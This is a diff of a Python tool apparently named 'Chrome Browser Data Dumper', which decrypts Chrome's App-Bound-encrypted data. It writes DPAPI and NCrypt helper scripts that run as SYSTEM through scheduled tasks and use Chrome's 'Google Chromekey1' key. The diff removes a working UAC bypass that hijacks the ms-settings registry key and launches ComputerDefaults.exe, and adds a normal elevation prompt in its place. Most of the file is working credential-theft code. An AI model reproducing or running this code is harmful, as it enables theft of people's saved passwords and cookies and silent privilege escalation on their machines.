@@ -18,7 +18,6 @@ import time
 import subprocess
 import ctypes
 import ctypes.wintypes as _wt
-import winreg
 from pathlib import Path
 from datetime import datetime, timedelta
 
@@ -41,81 +40,82 @@ CHROME_PATH = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Dat
 # App-Bound Encryption helpers (Chrome 127+, v20 format)
 # ---------------------------------------------------------------------------
 
-def _helper_dpapi_main() -> None:
-    """SYSTEM helper mode: CryptUnprotectData(argv[2]) -> argv[3], error -> argv[4]."""
-    cipher_file, result_file, err_file = sys.argv[2], sys.argv[3], sys.argv[4]
-    crypt32 = ctypes.WinDLL('crypt32', use_last_error=True)
+_OUTER_DPAPI_SCRIPT = r"""
+import ctypes, ctypes.wintypes as wt, sys
+crypt32 = ctypes.WinDLL('crypt32', use_last_error=True)
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [('cbData', wt.DWORD), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
+with open(sys.argv[1], 'rb') as f:
+    data = f.read()
+in_b = DATA_BLOB(len(data), (ctypes.c_ubyte * len(data))(*data))
+out_b = DATA_BLOB()
+ok = crypt32.CryptUnprotectData(ctypes.byref(in_b), None, None, None, None, 0, ctypes.byref(out_b))
+if ok:
+    with open(sys.argv[2], 'wb') as f:
+        f.write(bytes(out_b.pbData[:out_b.cbData]))
+else:
+    with open(sys.argv[3], 'w') as f:
+        f.write(hex(ctypes.get_last_error() & 0xFFFFFFFF))
+"""
 
-    class _BLOB(ctypes.Structure):
-        _fields_ = [('cbData', _wt.DWORD), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
+_NCRYPT_DECRYPT_SCRIPT = r"""
+import ctypes, sys
 
-    with open(cipher_file, 'rb') as f:
-        data = f.read()
-    in_b = _BLOB(len(data), (ctypes.c_ubyte * len(data))(*data))
-    out_b = _BLOB()
-    ok = crypt32.CryptUnprotectData(ctypes.byref(in_b), None, None, None, None, 0, ctypes.byref(out_b))
-    if ok:
-        with open(result_file, 'wb') as f:
-            f.write(bytes(out_b.pbData[:out_b.cbData]))
-    else:
-        with open(err_file, 'w') as f:
-            f.write(hex(ctypes.get_last_error() & 0xFFFFFFFF))
+ncrypt_dll = ctypes.WinDLL("ncrypt.dll")
+NCRYPT_SILENT_FLAG = 0x40
 
-def _helper_ncrypt_main() -> None:
-    """SYSTEM helper mode: NCrypt decrypt argv[2] -> argv[3], error -> argv[4]."""
-    input_file, result_file, err_file = sys.argv[2], sys.argv[3], sys.argv[4]
-    ncrypt_dll = ctypes.WinDLL("ncrypt.dll")
-    NCRYPT_SILENT_FLAG = 0x40
+with open(sys.argv[1], 'r') as f:
+    data = bytes.fromhex(f.read().strip())
 
-    with open(input_file, 'r') as f:
-        data = bytes.fromhex(f.read().strip())
+hProvider = ctypes.c_void_p(0)
+status = ncrypt_dll.NCryptOpenStorageProvider(
+    ctypes.byref(hProvider),
+    ctypes.c_wchar_p("Microsoft Software Key Storage Provider"),
+    ctypes.c_ulong(0)
+)
+if status != 0:
+    open(sys.argv[3], 'w').write(f"NCryptOpenStorageProvider failed: {status:#010x}")
+    sys.exit(1)
 
-    hProvider = ctypes.c_void_p(0)
-    status = ncrypt_dll.NCryptOpenStorageProvider(
-        ctypes.byref(hProvider),
-        ctypes.c_wchar_p("Microsoft Software Key Storage Provider"),
-        ctypes.c_ulong(0)
-    )
-    if status != 0:
-        open(err_file, 'w').write(f"NCryptOpenStorageProvider failed: {status:#010x}")
-        return
-
-    hKey = ctypes.c_void_p(0)
-    status = ncrypt_dll.NCryptOpenKey(
-        hProvider,
-        ctypes.byref(hKey),
-        ctypes.c_wchar_p("Google Chromekey1"),
-        ctypes.c_ulong(0),
-        ctypes.c_ulong(0)
-    )
-    if status != 0:
-        open(err_file, 'w').write(f"NCryptOpenKey failed: {status:#010x}")
-        ncrypt_dll.NCryptFreeObject(hProvider)
-        return
-
-    input_buf = (ctypes.c_ubyte * len(data))(*data)
-    pcbResult = ctypes.c_ulong(0)
-
-    ncrypt_dll.NCryptDecrypt(
-        hKey, input_buf, ctypes.c_ulong(len(data)),
-        None, None, ctypes.c_ulong(0),
-        ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
-    )
-    out_size = pcbResult.value if pcbResult.value > 0 else len(data)
-    output_buf = (ctypes.c_ubyte * out_size)()
-
-    status = ncrypt_dll.NCryptDecrypt(
-        hKey, input_buf, ctypes.c_ulong(len(data)),
-        None, output_buf, ctypes.c_ulong(out_size),
-        ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
-    )
-    ncrypt_dll.NCryptFreeObject(hKey)
+hKey = ctypes.c_void_p(0)
+status = ncrypt_dll.NCryptOpenKey(
+    hProvider,
+    ctypes.byref(hKey),
+    ctypes.c_wchar_p("Google Chromekey1"),
+    ctypes.c_ulong(0),
+    ctypes.c_ulong(0)
+)
+if status != 0:
+    open(sys.argv[3], 'w').write(f"NCryptOpenKey failed: {status:#010x}")
     ncrypt_dll.NCryptFreeObject(hProvider)
-    if status != 0:
-        open(err_file, 'w').write(f"NCryptDecrypt failed: {status:#010x}")
-        return
+    sys.exit(1)
 
-    open(result_file, 'w').write(bytes(output_buf[:pcbResult.value]).hex())
+input_buf = (ctypes.c_ubyte * len(data))(*data)
+pcbResult = ctypes.c_ulong(0)
+
+# First call: query output size
+ncrypt_dll.NCryptDecrypt(
+    hKey, input_buf, ctypes.c_ulong(len(data)),
+    None, None, ctypes.c_ulong(0),
+    ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
+)
+out_size = pcbResult.value if pcbResult.value > 0 else len(data)
+output_buf = (ctypes.c_ubyte * out_size)()
+
+# Second call: actual decrypt
+status = ncrypt_dll.NCryptDecrypt(
+    hKey, input_buf, ctypes.c_ulong(len(data)),
+    None, output_buf, ctypes.c_ulong(out_size),
+    ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
+)
+ncrypt_dll.NCryptFreeObject(hKey)
+ncrypt_dll.NCryptFreeObject(hProvider)
+if status != 0:
+    open(sys.argv[3], 'w').write(f"NCryptDecrypt failed: {status:#010x}")
+    sys.exit(1)
+
+open(sys.argv[2], 'w').write(bytes(output_buf[:pcbResult.value]).hex())
+"""
 
 # Hardcoded keys embedded in Chrome's elevation_service.exe (per security research)
 # Flag 1 (Chrome 127-132): AES-256-GCM key
@@ -150,11 +150,15 @@ def _outer_dpapi_as_system(ciphertext: bytes) -> bytes:
     cipher_file = os.path.join(tmpdir, "c.bin")
     result_file = os.path.join(tmpdir, "r.bin")
     err_file = os.path.join(tmpdir, "e.txt")
+    script_file = os.path.join(tmpdir, "s.py")
     task_name = "ChromeOSCryptHelper"
 
     with open(cipher_file, "wb") as f:
         f.write(ciphertext)
+    with open(script_file, "w", encoding="utf-8") as f:
+        f.write(_OUTER_DPAPI_SCRIPT)
 
+    python_exe = sys.executable
     xml_file = os.path.join(tmpdir, "task.xml")
     # Use Task XML to avoid all command-line / PowerShell quoting issues.
     # Paths with spaces are safely embedded inside double-quoted Arguments in the XML.
@@ -166,8 +170,8 @@ def _outer_dpapi_as_system(ciphertext: bytes) -> bytes:
         "<RunLevel>HighestAvailable</RunLevel>"
         "</Principal></Principals>\n"
         '  <Actions Context="Author"><Exec>\n'
-        f"    <Command>{sys.executable}</Command>\n"
-        f'    <Arguments>"--_helper-dpapi" "{cipher_file}" "{result_file}" "{err_file}"</Arguments>\n'
+        f"    <Command>{python_exe}</Command>\n"
+        f'    <Arguments>"{script_file}" "{cipher_file}" "{result_file}" "{err_file}"</Arguments>\n'
         "  </Exec></Actions>\n"
         "</Task>\n"
     )
@@ -221,11 +225,15 @@ def _ncrypt_decrypt_as_system(data: bytes) -> bytes:
     input_file = os.path.join(tmpdir, "i.hex")
     result_file = os.path.join(tmpdir, "r.hex")
     err_file = os.path.join(tmpdir, "e.txt")
+    script_file = os.path.join(tmpdir, "s.py")
     task_name = "ChromeNCryptHelper"
 
     with open(input_file, "w") as f:
         f.write(data.hex())
+    with open(script_file, "w", encoding="utf-8") as f:
+        f.write(_NCRYPT_DECRYPT_SCRIPT)
 
+    python_exe = sys.executable
     xml_file = os.path.join(tmpdir, "task.xml")
     task_xml = (
         '<?xml version="1.0" encoding="UTF-16"?>\n'
@@ -235,8 +243,8 @@ def _ncrypt_decrypt_as_system(data: bytes) -> bytes:
         "<RunLevel>HighestAvailable</RunLevel>"
         "</Principal></Principals>\n"
         '  <Actions Context="Author"><Exec>\n'
-        f"    <Command>{sys.executable}</Command>\n"
-        f'    <Arguments>"--_helper-ncrypt" "{input_file}" "{result_file}" "{err_file}"</Arguments>\n'
+        f"    <Command>{python_exe}</Command>\n"
+        f'    <Arguments>"{script_file}" "{input_file}" "{result_file}" "{err_file}"</Arguments>\n'
         "  </Exec></Actions>\n"
         "</Task>\n"
     )
@@ -611,32 +619,6 @@ def save(data: list, filename: str) -> None:
     print(f"  -> {filename}  ({len(data)} records)")
 
 
-def computer_defaults_bypass() -> None:
-    """UAC bypass via ms-settings\\Shell\\Open\\command registry hijack (no UAC prompt)."""
-    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
-    cwd = os.getcwd()
-
-    if getattr(sys, 'frozen', False):
-        elevated_cmd = f'cmd.exe /k ""{sys.executable}" --elevated "{cwd}""'
-    else:
-        python_exe = sys.executable
-        script_path = os.path.abspath(sys.argv[0])
-        elevated_cmd = f'cmd.exe /k ""{python_exe}" "{script_path}" --elevated "{cwd}""'
-
-    try:
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, elevated_cmd)
-        winreg.CloseKey(key)
-
-        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"], shell=True)
-
-        time.sleep(3)
-        subprocess.run(['reg', 'delete', r'HKCU\Software\Classes\ms-settings', '/f'], capture_output=True)
-    except Exception as e:
-        print(f"[-] Bypass failed: {e}")
-
-
 def _is_admin() -> bool:
     try:
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
@@ -645,26 +627,26 @@ def _is_admin() -> bool:
 
 
 def main() -> None:
-    # Helper modes: invoked as SYSTEM by scheduled tasks (no UAC needed)
-    if len(sys.argv) > 1 and sys.argv[1] == '--_helper-dpapi':
-        _helper_dpapi_main()
-        return
-    if len(sys.argv) > 1 and sys.argv[1] == '--_helper-ncrypt':
-        _helper_ncrypt_main()
-        return
-
     # Auto-elevate if not running as administrator (needed for SYSTEM scheduled task)
-    if "--elevated" in sys.argv:
-        # Re-launched with elevation by computer_defaults_bypass().
-        # Restore original working directory passed as the next argument.
-        try:
-            idx = sys.argv.index("--elevated")
-            original_cwd = sys.argv[idx + 1]
-            os.chdir(original_cwd)
-        except (IndexError, FileNotFoundError):
-            pass
-    elif not _is_admin():
-        computer_defaults_bypass()
+    if not _is_admin():
+        print("Not running as administrator.")
+        print("Re-launching with UAC elevation (a UAC prompt will appear)...")
+        script = os.path.abspath(sys.argv[0])
+        cwd = os.getcwd()
+        extra = " ".join(f'"{a}"' for a in sys.argv[1:])
+        ps_cmd = (
+            f"Start-Process -FilePath '{sys.executable}'"
+            f" -ArgumentList '\"{script}\" {extra}'"
+            f" -WorkingDirectory '{cwd}'"
+            f" -Verb RunAs -Wait"
+        )
+        result = subprocess.run(
+            ["powershell", "-NoProfile", "-Command", ps_cmd],
+            capture_output=True,
+        )
+        if result.returncode != 0:
+            print("UAC elevation failed. Please run this script as Administrator.")
+            sys.exit(1)
         sys.exit(0)
 
     print("=== Chrome Browser Data Dumper ===\n")
